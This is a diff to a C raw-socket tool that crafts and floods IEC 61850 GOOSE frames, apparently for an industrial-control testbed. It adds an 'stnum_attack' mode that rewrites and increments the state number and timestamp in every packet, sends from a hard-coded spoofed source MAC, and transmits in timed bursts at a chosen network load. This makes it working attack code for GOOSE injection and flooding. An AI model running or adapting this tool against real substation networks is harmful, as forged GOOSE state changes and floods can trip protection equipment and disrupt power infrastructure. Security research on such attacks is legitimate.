@@ -11,11 +11,12 @@
 #include <string.h>
 #include <linux/if_packet.h>
 #include <unistd.h>
+#include <inttypes.h>
 #include <time.h>
 #include "raw_sock_goose.h"
 
 #define BUFSIZE  1500
-#define DEFAULT_IFACE "eno1"
+#define DEFAULT_IFACE "eth0"
 
 uint8_t asciiToHex(uint8_t * hmac)
 {
@@ -117,6 +118,92 @@ int ber_encode(char tag, char * data, uint16_t length, char * buffer)
 	}
 	i += length;
 	return i;
+}
+
+int goose_update_packet(char * send_buffer, int send_length, struct goose_indices * data_indices, uint32_t state_number)
+{
+	int increase = 0;
+	char goose_updated_timestamp[10];
+	char updated_stnum[8];
+	int currStNum;
+	uint64_t goose_timestamp_unencoded = goose_timestamp();
+	uint64_t swapped_timestamp;
+	swapped_timestamp = be64toh(goose_timestamp_unencoded);
+	char * tstamp_ptr = &swapped_timestamp;
+	char tstamp_ber_buffer[10];
+	int ber_length = ber_encode(TIMESTAMP_TAG, tstamp_ptr, 8, tstamp_ber_buffer);
+
+	int working_index = data_indices->timestamp_index +sizeof(struct ether_header);
+
+	for(int i = 0; i<10; i++)
+	{
+		send_buffer[working_index+i] = tstamp_ber_buffer[i];
+	}
+
+	int stnum_length = data_indices->sequence_index - data_indices->state_index;
+	uint32_t swap = be32toh(state_number);
+	char state_number_pointer[4];
+	char state_number_buffer[8];
+	uint16_t length = 0;
+	if(state_number < 256)
+	{
+		length = 1;
+	}
+	else if(state_number < 65536)
+	{
+		length = 2;
+	}
+	else if(state_number < 16777216)
+	{
+		length = 3;
+	}
+	else
+	{
+		length = 4;
+	}
+	for(int i = 0; i < length; i++)
+	{
+		state_number_pointer[length-i-1] = (swap >> (3-i)*8);
+	}
+	ber_length = ber_encode(STATE_TAG, state_number_pointer, length, state_number_buffer);
+	if (ber_length > stnum_length)
+	{
+		increase = 1;
+		//update length
+		++send_length;
+		uint16_t length_buffer = send_buffer[sizeof(struct ether_header)+2] << 8 | send_buffer[sizeof(struct ether_header)+3];
+		++length_buffer;
+		send_buffer[sizeof(struct ether_header)+2] = (char)length_buffer >> 8;
+		send_buffer[sizeof(struct ether_header)+3] = (char)length_buffer;
+
+		int rewrite_length = send_length - data_indices->state_index+2;
+		uint8_t old,new;
+		int start_point = sizeof(struct ether_header)+data_indices->sequence_index;
+		new = send_buffer[start_point];
+		//rewrite to buffer
+		for(int i = start_point; i < send_length-1; i++)
+		{
+			old = send_buffer[i+1];
+			send_buffer[i+1] = new;
+			new = old;
+		}
+		//update all indexes
+		data_indices->sequence_index++;
+		data_indices->test_index++;
+		data_indices->confrev_index++;
+		data_indices->ndscom_index++;
+		data_indices->numdatasetentries_index++;
+		data_indices->packet_length++;
+		send_buffer[sizeof(struct ether_header)+sizeof(struct goose_apdu)-1]++;
+	}
+	int start_point = sizeof(struct ether_header)+data_indices->state_index;
+	for(int i = 0; i<ber_length; i++)
+	{
+		send_buffer[start_point+i] = state_number_buffer[i];
+	}
+	//increment pduheader
+
+	return increase;
 }
 int goose_build_pduheader(char * data_buffer, char * packet_buffer, struct goose_indices * data_indices)
 {
@@ -255,7 +342,7 @@ int goose_args(char * packet_buffer, char * data_buffer, struct goose_indices * 
 	pdu_length_size++;
 	
 	//Reserved1&2 + pdu tag are added for apdu length
-	apdu->length = pdu_length+pdu_length_size+5;
+	apdu->length = pdu_length+pdu_length_size+9;
 
 	//The APDU header is complete. All that is left is to finish packet generation
 	for(int i=0; i < pdu_length; i++)
@@ -270,8 +357,9 @@ int goose_args(char * packet_buffer, char * data_buffer, struct goose_indices * 
 		*curr_idx += pdu_length_size;
 		curr_idx++;
 	}
-
-	return apdu->length + 4;;
+	free(temp_buff);
+	free(numdata_buff);
+	return apdu->length;
 }
 
 int default_goose_args(char * packet_buffer, struct goose_indices * data_indices)
@@ -280,12 +368,12 @@ int default_goose_args(char * packet_buffer, struct goose_indices * data_indices
 	char * data_buffer = (char *) malloc(BUFSIZE * sizeof(char));
 	char * encoding_buffer = data_buffer;
 	//data_buffer: |appid|gocbref|tat|dataset|goid|stnum|sqnum|test|confref|ndscom|#dataset|datatype,len,data|
-	char appid[2] = {0x12,0x10};
+	char appid[2] = {0x03,0x00};
 	strcpy(encoding_buffer, appid);
 	encoding_buffer += 2;	
 	idx += 2;
 	
-	char gocbRef[22] = "HPLSCFG/LLN0$GO$GPub01";
+	char gocbRef[22] = "LPNSCFG/LLN0$GO$GPub01";
 	data_indices->gocbref_index = idx;
 	strcpy(encoding_buffer, gocbRef);
 	encoding_buffer += 22;	
@@ -297,17 +385,17 @@ int default_goose_args(char * packet_buffer, struct goose_indices * data_indices
 	encoding_buffer += 2;	
 	idx += 2;
 	
-	char datSet[21] = "HPLSCFG/LLN0$URDSet01";
+	char datSet[21] = "LPNSCFG/LLN0$URDSet01";
 	data_indices->dataset_index = idx;
 	strcpy(encoding_buffer, datSet);
 	encoding_buffer += 21;	
 	idx += 21;
 	
-	char goID[8] = "Feeder_1";
+	char goID[8] = "LPNS";
 	data_indices->goid_index = idx;
 	strcpy(encoding_buffer, goID);
-	encoding_buffer += 8;	
-	idx += 8;
+	encoding_buffer += 4;	
+	idx += 4;
 	
 	char zero = 0x00;
 	data_indices->state_index = idx;
@@ -316,7 +404,7 @@ int default_goose_args(char * packet_buffer, struct goose_indices * data_indices
 	idx++;
 	
 	data_indices->sequence_index = idx;
-	*encoding_buffer = zero;
+	*encoding_buffer = 0x00;
 	encoding_buffer++;
 	idx++;
 	
@@ -331,7 +419,7 @@ int default_goose_args(char * packet_buffer, struct goose_indices * data_indices
 	idx++;
 	
 	data_indices->ndscom_index = idx;
-	*encoding_buffer = 0x01;
+	*encoding_buffer = 0x00;
 	encoding_buffer++;
 	idx++;
 
@@ -342,7 +430,7 @@ int default_goose_args(char * packet_buffer, struct goose_indices * data_indices
 	
 	idx++;
 	data_indices->packet_length = idx;
-	char data[14] = {0x87,0x05, 0x80, 0x00, 0x00, 0x00, 0x00, 0x83, 0x01, 0x00, 0x84, 0x02, 0x06, 0x40};
+	char data[14] = {0x83, 0x01, 0x00, 0x87,0x05, 0x80,0x00, 0x00, 0x00, 0x00, 0x84, 0x02, 0x06, 0x40};
 	memcpy(encoding_buffer, data, 14);
 	encoding_buffer += 14;
 	
@@ -358,9 +446,25 @@ int packets_per_second(int load, int packet_length)
 	return traffic / (packet_length *8);
 }
 
+time_t inittimestamp()
+{
+	struct timespec start;
+	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &start);
+	return start.tv_sec;
+}
+
+uint64_t gettimestamp(time_t start_seconds)
+{
+	struct timespec now;
+	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &now);
+	uint64_t seconds = (uint64_t)(now.tv_sec - start_seconds);
+	uint64_t timestamp = seconds*1000000000 + now.tv_nsec;
+	return timestamp;
+}
 
 void main(int argc, uint8_t* argv[])
 {
+
 	int sock,iface_idx, line_size, load, pps; 
 	long delay_per_packet;
 	struct timespec delay;
@@ -374,20 +478,42 @@ void main(int argc, uint8_t* argv[])
 	struct timespec start, current;
 	int elapsed, elapsed_raw;
 	long nsec_spent, curr_delay;
+	uint64_t runtime;
 	long packets_sent;
 	int on = 1;
-	char DMAC[12] = {"010ccd010001"};
-	char SMAC[12] = {0x00};
+	char DMAC[12] = {"010ccd010003"};
+	char SMAC[12] = {"dca632910000"};
 	unsigned int len = sizeof(on);
 	FILE *params;
 	struct goose_indices * data_indices = (struct goose_indices *)malloc(sizeof(struct goose_indices));
 	char * goose_buffer = (char *) malloc(BUFSIZE);	
+	int stnum_attack = 1;
+	uint32_t state_number = 1;
+	if(argc >= 2)
+	{
+		load = atoi(argv[1]);
 
-	if(argc < 2)
+	}else
+	{	
+		load = 50;
+	}
+	if(argc >= 3)
+	{	runtime = atoi(argv[2]);
+
+	}
+	else
+	{
+		runtime = 20;
+	}
+	if(argc >= 4)
+	{
+		stnum_attack = atoi(argv[3]);
+	}
+	if(argc < 5)
 	{
 		printf("No parameters passed...using defaults");
+		fflush(stdout);
 		packet_len = default_goose_args(goose_buffer, data_indices);
-		load = 1;
 	}
 	else
 	{
@@ -419,8 +545,11 @@ void main(int argc, uint8_t* argv[])
 			eth->ether_shost[i] = ((uint8_t *)&iface_mac.ifr_hwaddr.sa_data)[i];
 		}
 	}
+	else{
+		parseMac(SMAC, eth, socket_address, 0);
+	}
 
-		//Open Socket
+	//Open Socket
  	sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
 	sock >= 0 ? : perror("Socket Creation");
 	//Make non-blocking calls
@@ -454,74 +583,88 @@ void main(int argc, uint8_t* argv[])
 		send_buffer[eth_hdr_len+g] = goose_buffer[g];
 	}
 	send_length = packet_len + eth_hdr_len;
-	while(load <= 10)
+	int burst_size = 0;
+	int num_bursts = 0;
+	
+	int start_load = load;
+	while(load == start_load)
 	{
 		pps = packets_per_second(load, send_length);
+		delay_per_packet = 1000000000 / pps;
 
-		struct timespec delay;
-		delay.tv_sec = 0;
-		delay.tv_nsec= delay_per_packet;
-
-		elapsed = 0;
-		elapsed_raw = 0;
-		packets_sent = 0;
-		clock_gettime(CLOCK_REALTIME, &start);
-		clock_gettime(CLOCK_REALTIME, &current);
-		int burst_size = 0;
-		int num_bursts = 0;
-		int iterations = 0;
-		int last = 0;
-		while(elapsed < 8)
+		burst_size = pps / 100;
+		num_bursts = 100;
+		if(burst_size == 0)
 		{
-			if(load >= 50)
+			num_bursts = 1;
+			burst_size = pps;
+		}
+
+		if(load >= 80)
+		{
+			burst_size = pps / 500;
+			num_bursts = 500;
+		}else if(load >= 30)
+		{
+			burst_size = pps / 300;
+			num_bursts = 300;
+		}
+
+		uint64_t burst_temp = burst_size;
+		uint64_t delay_per_burst = burst_size * delay_per_packet;
+		//clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &start);
+		struct timespec remain;
+		delay.tv_sec = 0;
+		remain.tv_sec = 0;
+		time_t start_seconds = inittimestamp();
+		uint64_t first_burst_start, next_burst_start, now;
+		first_burst_start = next_burst_start = gettimestamp(start_seconds);
+		uint64_t max_runtime_ns = (runtime * 1000000000) + first_burst_start;
+		int iterations_without_sleep = 0;
+		
+
+		while(1)
+		{
+			if(iterations_without_sleep)
 			{
-				burst_size = pps / 120;
-				num_bursts = 120;
+				burst_size += burst_size;
 			}
-			else{
-				burst_size = pps / 50;
-				num_bursts = 50;
-			}
-			nsec_spent = current.tv_nsec;
-			if(iterations < (num_bursts * (elapsed + 1)))
+			for(int i = 0; i < burst_size; i++)
 			{
-				last == 0;
-				for(int i = 0; i < burst_size; i++)
+				if(stnum_attack)
 				{
-					sendto(sock, send_buffer, send_length, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll));// >= 0 ? : perror("sending"); 
+					++state_number;
+					int increase = goose_update_packet(send_buffer, send_length, data_indices, state_number);
+					if(increase)
+					{
+						++send_length;
+					}
 				}
-				packets_sent += burst_size;
-				iterations++;
-				last = 0;
-			}else if (iterations == (num_bursts * (elapsed + 1)) && last == 0)
+				sendto(sock, send_buffer, send_length, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll));// >= 0 ? : perror("sending"); 
+			}
+			burst_size = burst_temp;
+			next_burst_start += delay_per_burst;
+			now = gettimestamp(start_seconds);
+			if(now > max_runtime_ns)
 			{
-				last = 1;
-				for(int i = 0; i < pps % num_bursts; i++)
+				break;
+			}
+			if(next_burst_start > now)
+			{
+				iterations_without_sleep = 0;
+				while(now < next_burst_start)
 				{
-					sendto(sock, send_buffer, send_length, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll));// >= 0 ? : perror("sending"); 
+					for(int sleep = 0; sleep < 200; sleep++)
+					{
+						asm("nop");
+					}
+					now = gettimestamp(start_seconds);
 				}
-			}
-			clock_gettime(CLOCK_REALTIME, &current);
-			elapsed_raw = current.tv_sec - start.tv_sec;
-			if(current.tv_nsec > start.tv_nsec)
-			{
-
-				elapsed = elapsed_raw;
-			}
-
-
-			if(nsec_spent <= current.tv_nsec)
-			{
-				curr_delay = current.tv_nsec-nsec_spent;
 			}
 			else
 			{
-				curr_delay = 1000000000 + current.tv_nsec - nsec_spent;
-			}
-			if(curr_delay < delay_per_packet && last != 1)
-			{
-				delay.tv_nsec = (delay_per_packet*burst_size) - curr_delay; 
-				nanosleep(&delay, NULL);
+				next_burst_start += delay_per_burst;
+				iterations_without_sleep=1;
 			}
 		}
 		if(load >= 10)
@@ -534,6 +677,7 @@ void main(int argc, uint8_t* argv[])
 		}
 	}
 	close(sock);
-	free(NULL);
+	free(iface_name);
+	free(data_indices);
+	free(goose_buffer);
 }
-
